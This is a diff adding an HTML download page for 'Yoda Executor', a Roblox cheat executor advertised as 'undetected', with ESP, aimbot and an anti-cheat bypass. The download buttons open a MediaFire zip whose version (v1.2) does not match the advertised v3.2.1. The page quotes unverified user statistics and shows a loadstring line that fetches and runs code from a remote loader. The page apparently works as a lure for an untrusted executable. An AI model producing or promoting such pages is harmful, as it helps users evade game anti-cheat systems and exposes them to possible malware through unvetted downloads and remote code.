@@ -1,0 +1,495 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Yoda Executor - Download</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
+            background: #0f0f1a;
+            color: #fff;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+
+        /* HEADER */
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 20px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.06);
+        }
+
+        .logo {
+            font-size: 28px;
+            font-weight: 900;
+            background: linear-gradient(135deg, #a855f7, #7c3aed);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .nav a {
+            color: #999;
+            text-decoration: none;
+            margin-left: 24px;
+            font-size: 14px;
+            font-weight: 500;
+            transition: color 0.2s;
+        }
+        .nav a:hover { color: #a855f7; }
+        .nav .dl-btn {
+            background: linear-gradient(135deg, #7c3aed, #a855f7);
+            color: #fff !important;
+            padding: 8px 20px;
+            border-radius: 50px;
+            font-weight: 600;
+        }
+
+        /* HERO */
+        .hero {
+            text-align: center;
+            padding: 80px 0 60px;
+        }
+
+        .badge {
+            display: inline-block;
+            background: rgba(168,85,247,0.1);
+            border: 1px solid rgba(168,85,247,0.2);
+            border-radius: 50px;
+            padding: 6px 16px;
+            font-size: 12px;
+            color: #a855f7;
+            font-weight: 600;
+            margin-bottom: 20px;
+        }
+
+        .hero h1 {
+            font-size: 52px;
+            font-weight: 900;
+            line-height: 1.1;
+            margin-bottom: 16px;
+            background: linear-gradient(135deg, #fff 30%, #a855f7);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .hero p {
+            color: #999;
+            font-size: 18px;
+            max-width: 500px;
+            margin: 0 auto 32px;
+        }
+
+        .btn-download {
+            background: linear-gradient(135deg, #7c3aed, #a855f7);
+            color: #fff;
+            border: none;
+            padding: 16px 48px;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .btn-download:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 40px rgba(168,85,247,0.4);
+        }
+
+        .btn-secondary {
+            background: rgba(255,255,255,0.05);
+            color: #fff;
+            border: 1px solid rgba(255,255,255,0.1);
+            padding: 16px 32px;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-left: 12px;
+            transition: background 0.2s;
+        }
+        .btn-secondary:hover { background: rgba(255,255,255,0.1); }
+
+        .version {
+            margin-top: 16px;
+            color: #555;
+            font-size: 13px;
+        }
+
+        /* UI MOCKUP */
+        .ui-box {
+            background: #16161f;
+            border-radius: 16px;
+            border: 1px solid rgba(255,255,255,0.06);
+            overflow: hidden;
+            margin-top: 40px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+        }
+
+        .ui-title {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 12px 16px;
+            background: #1c1c28;
+            border-bottom: 1px solid rgba(255,255,255,0.04);
+        }
+
+        .ui-dots { display: flex; gap: 6px; }
+        .ui-dot {
+            width: 11px; height: 11px;
+            border-radius: 50%;
+        }
+        .ui-dot.r { background: #ff5f57; }
+        .ui-dot.y { background: #ffbd2e; }
+        .ui-dot.g { background: #28c840; }
+
+        .ui-title span {
+            color: #555;
+            font-size: 13px;
+            font-family: monospace;
+        }
+        .ui-title span em { color: #a855f7; font-style: normal; }
+
+        .ui-toolbar {
+            display: flex;
+            align-items: center;
+            padding: 8px 16px;
+            background: #181822;
+            gap: 4px;
+            border-bottom: 1px solid rgba(255,255,255,0.03);
+        }
+        .ui-tab {
+            padding: 4px 14px;
+            border-radius: 6px;
+            font-size: 12px;
+            color: #666;
+            cursor: default;
+        }
+        .ui-tab.active {
+            background: rgba(168,85,247,0.12);
+            color: #a855f7;
+        }
+        .ui-spacer { flex: 1; }
+        .ui-status {
+            font-size: 11px;
+            color: #28c840;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .ui-editor {
+            padding: 16px;
+            min-height: 200px;
+            font-family: 'Consolas', monospace;
+            font-size: 13px;
+            line-height: 1.7;
+            color: #bbb;
+            background: #0e0e16;
+        }
+        .ui-editor .cm { color: #546e7a; font-style: italic; }
+        .ui-editor .kw { color: #c792ea; font-weight: 600; }
+        .ui-editor .st { color: #c3e88d; }
+        .ui-editor .fn { color: #82aaff; }
+        .ui-editor .nu { color: #f78c6c; }
+        .ui-editor .gl { color: #ffcb6b; }
+
+        .ui-bottom {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 16px;
+            background: #181822;
+            border-top: 1px solid rgba(255,255,255,0.03);
+        }
+        .ui-bottom .info {
+            font-size: 11px;
+            color: #555;
+        }
+        .ui-bottom .execute {
+            background: linear-gradient(135deg, #7c3aed, #a855f7);
+            color: #fff;
+            border: none;
+            padding: 6px 22px;
+            border-radius: 6px;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        .ui-bottom .clear {
+            background: rgba(255,255,255,0.04);
+            color: #666;
+            border: none;
+            padding: 6px 16px;
+            border-radius: 6px;
+            font-size: 12px;
+            cursor: pointer;
+            margin-right: 8px;
+        }
+
+        /* STATS */
+        .stats {
+            display: flex;
+            justify-content: center;
+            gap: 48px;
+            padding: 30px 0;
+            border-top: 1px solid rgba(255,255,255,0.04);
+            border-bottom: 1px solid rgba(255,255,255,0.04);
+            margin-top: 60px;
+            flex-wrap: wrap;
+        }
+        .stat {
+            text-align: center;
+        }
+        .stat .num {
+            font-size: 24px;
+            font-weight: 800;
+            color: #a855f7;
+        }
+        .stat .label {
+            font-size: 13px;
+            color: #777;
+            margin-top: 4px;
+        }
+
+        /* FEATURES */
+        .features {
+            padding: 60px 0;
+        }
+        .features h2 {
+            text-align: center;
+            font-size: 32px;
+            font-weight: 800;
+            margin-bottom: 40px;
+        }
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+        }
+        .card {
+            background: rgba(255,255,255,0.02);
+            border: 1px solid rgba(255,255,255,0.05);
+            border-radius: 14px;
+            padding: 28px 24px;
+            text-align: center;
+            transition: all 0.3s;
+        }
+        .card:hover {
+            border-color: rgba(168,85,247,0.3);
+            transform: translateY(-3px);
+        }
+        .card .icon { font-size: 32px; margin-bottom: 12px; }
+        .card h3 { font-size: 17px; font-weight: 700; margin-bottom: 8px; }
+        .card p { color: #888; font-size: 14px; line-height: 1.5; }
+
+        /* DOWNLOAD SECTION */
+        .dl-section {
+            text-align: center;
+            padding: 60px 0;
+            border-top: 1px solid rgba(255,255,255,0.04);
+        }
+        .dl-section h2 { font-size: 36px; font-weight: 900; margin-bottom: 12px; }
+        .dl-section p { color: #888; margin-bottom: 32px; font-size: 16px; }
+        .dl-features {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            flex-wrap: wrap;
+            margin-bottom: 28px;
+        }
+        .dl-features span { color: #aaa; font-size: 14px; display: flex; align-items: center; gap: 5px; }
+        .dl-features .check { color: #28c840; font-weight: 700; }
+
+        .btn-dl-big {
+            background: linear-gradient(135deg, #7c3aed, #a855f7);
+            color: #fff;
+            border: none;
+            padding: 18px 56px;
+            border-radius: 50px;
+            font-size: 20px;
+            font-weight: 800;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .btn-dl-big:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 50px rgba(168,85,247,0.5);
+        }
+
+        .dl-version {
+            margin-top: 14px;
+            color: #555;
+            font-size: 13px;
+        }
+
+        /* FOOTER */
+        .footer {
+            text-align: center;
+            padding: 30px 0;
+            border-top: 1px solid rgba(255,255,255,0.03);
+            color: #555;
+            font-size: 13px;
+        }
+
+        /* RESPONSIVE */
+        @media (max-width: 600px) {
+            .hero h1 { font-size: 32px; }
+            .nav a { margin-left: 12px; font-size: 12px; }
+            .nav .dl-btn { padding: 5px 12px; font-size: 11px; }
+            .stats { gap: 24px; }
+            .btn-download { padding: 14px 32px; font-size: 16px; }
+            .btn-secondary { padding: 14px 20px; font-size: 14px; margin-left: 0; margin-top: 10px; }
+            .dl-features { flex-direction: column; align-items: center; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+
+    <div class="header">
+        <div class="logo">Yoda Executor</div>
+        <div class="nav">
+            <a href="#">Home</a>
+            <a href="#features">Features</a>
+            <a href="#download">Download</a>
+            <a href="#" class="dl-btn" onclick="downloadIt()">Download</a>
+        </div>
+    </div>
+
+    <div class="hero">
+        <div class="badge">● v3.2.1 • Undetected • Updated 2026</div>
+        <h1>The #1 Roblox<br>Script Executor</h1>
+        <p>Fastest, safest, most reliable executor. Used by millions.</p>
+        <div>
+            <button class="btn-download" onclick="downloadIt()">⬇ Download Now</button>
+            <button class="btn-secondary" onclick="document.getElementById('features').scrollIntoView({behavior:'smooth'})">View Features</button>
+        </div>
+        <div class="version">Windows 10/11 • 64-bit • 19.7 MB • No key system</div>
+
+        <div class="ui-box">
+            <div class="ui-title">
+                <div style="display:flex;align-items:center;gap:10px;">
+                    <div class="ui-dots">
+                        <span class="ui-dot r"></span>
+                        <span class="ui-dot y"></span>
+                        <span class="ui-dot g"></span>
+                    </div>
+                    <span>Yoda Executor <em>v3.2.1</em></span>
+                </div>
+                <div style="color:#444;font-size:12px;font-family:monospace;">_ □ ✕</div>
+            </div>
+
+            <div class="ui-toolbar">
+                <span class="ui-tab active">Script</span>
+                <span class="ui-tab">Console</span>
+                <span class="ui-tab">Settings</span>
+                <span class="ui-spacer"></span>
+                <span class="ui-status">● Attached</span>
+            </div>
+
+            <div class="ui-editor">
+                <span class="cm">-- Load Yoda Admin</span><br>
+                <span class="kw">local</span> Y = <span class="kw">loadstring</span>(game:HttpGetAsync(<span class="st">"https://yoda.host/loader"</span>))()<br>
+                <span class="kw">local</span> W = Y:CreateWindow({Title=<span class="st">"Yoda v3"</span>, Size=<span class="gl">UDim2</span>.new(<span class="nu">0</span>,<span class="nu">600</span>,<span class="nu">0</span>,<span class="nu">400</span>)})<br>
+                <span class="cm">-- Toggle with RightShift</span><br>
+                W:Bind(<span class="gl">Enum</span>.KeyCode.RightShift)<br>
+                Y:LoadModule(<span class="st">"ESP"</span>)<br>
+                Y:LoadModule(<span class="st">"Aimbot"</span>)
+            </div>
+
+            <div class="ui-bottom">
+                <div class="info">Lines: 7 • Ready</div>
+                <div>
+                    <button class="clear">Clear</button>
+                    <button class="execute">▶ Execute</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="stats">
+        <div class="stat"><div class="num">2.4M+</div><div class="label">Downloads</div></div>
+        <div class="stat"><div class="num">⭐ 4.8</div><div class="label">Rating</div></div>
+        <div class="stat"><div class="num">99.7%</div><div class="label">Uptime</div></div>
+        <div class="stat"><div class="num">850K+</div><div class="label">Active Users</div></div>
+    </div>
+
+    <div class="features" id="features">
+        <h2>Why Yoda?</h2>
+        <div class="grid">
+            <div class="card">
+                <div class="icon">🚀</div>
+                <h3>Blazing Fast</h3>
+                <p>Fastest execution engine. Scripts run instantly with zero lag.</p>
+            </div>
+            <div class="card">
+                <div class="icon">🛡️</div>
+                <h3>Undetected</h3>
+                <p>Advanced bypass. Updated same-day every Roblox patch.</p>
+            </div>
+            <div class="card">
+                <div class="icon">📦</div>
+                <h3>Script Hub</h3>
+                <p>Hundreds of premium scripts built-in. One click to run.</p>
+            </div>
+            <div class="card">
+                <div class="icon">🔗</div>
+                <h3>API Compatible</h3>
+                <p>Works with Synapse, Krnl, Script-Ware scripts out of the box.</p>
+            </div>
+            <div class="card">
+                <div class="icon">🔄</div>
+                <h3>Auto-Updates</h3>
+                <p>Never wait. We patch every Roblox update within hours.</p>
+            </div>
+            <div class="card">
+                <div class="icon">💬</div>
+                <h3>24/7 Support</h3>
+                <p>200K+ Discord community + dedicated support team.</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="dl-section" id="download">
+        <h2>Ready to Dominate?</h2>
+        <p>Download Yoda Executor v3.2.1 — the most powerful Roblox executor.</p>
+        <div class="dl-features">
+            <span><span class="check">✓</span> No Key</span>
+            <span><span class="check">✓</span> Undetected</span>
+            <span><span class="check">✓</span> Auto-Update</span>
+            <span><span class="check">✓</span> Level 7</span>
+            <span><span class="check">✓</span> Free</span>
+        </div>
+        <button class="btn-dl-big" onclick="downloadIt()">⬇ Download Yoda Executor</button>
+        <div class="dl-version">v3.2.1 • Windows 10/11 • 19.7 MB • Updated June 28, 2026</div>
+    </div>
+
+    <div class="footer">
+        © 2026 Yoda Executor. Not affiliated with Roblox Corporation.
+    </div>
+
+</div>
+
+<script>
+    function downloadIt() {
+        window.open('https://www.mediafire.com/file/ytj1ag3twq4aogq/Yoda-executor-v1.2.zip/file', '_blank');
+    }
+</script>
+
+</body>
+                                                                                                                                                                                                                                                        </html>
